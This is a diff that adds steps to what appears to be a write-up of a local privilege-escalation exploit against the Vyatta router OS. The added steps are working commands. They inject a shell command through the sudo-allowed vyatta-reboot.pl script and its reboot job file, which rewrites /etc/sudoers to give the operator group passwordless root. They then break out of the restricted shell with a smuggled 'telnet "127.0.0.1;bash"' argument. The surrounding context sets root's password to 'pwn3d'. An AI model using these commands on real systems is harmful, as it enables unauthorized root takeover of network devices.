@@ -32,3 +32,18 @@ You can exploit the `vyatta-reboot.pl` script to change the root password:<br />
 `rm /var/run/reboot.job`
 
 Now exit the CLI as the operator account and login as `root` with a password of `pwn3d`.
+
+As an alternative to changing/setting root's password you could remove sudo restrictions on the `operator` account:<br />
+``echo '`cp /etc/sudoers /tmp/; echo "%operator ALL=NOPASSWD: ALL" >> /tmp/sudoers; mv /tmp/sudoers /etc/; chmod 440 /etc/sudoers; chown root:root /etc/sudoers`' > /var/run/reboot.job``
+
+`sudo /opt/vyatta/bin/sudo-users/vyatta-reboot.pl --action show_reboot`
+
+`rm /var/run/reboot.job`
+
+Now exit the CLI as the operator account and log back in as operator.  Break out of the restricted shell, escalate to a root shell and verify.<br />
+`telnet "127.0.0.1;bash"`
+
+`sudo su -`
+
+`id`
+
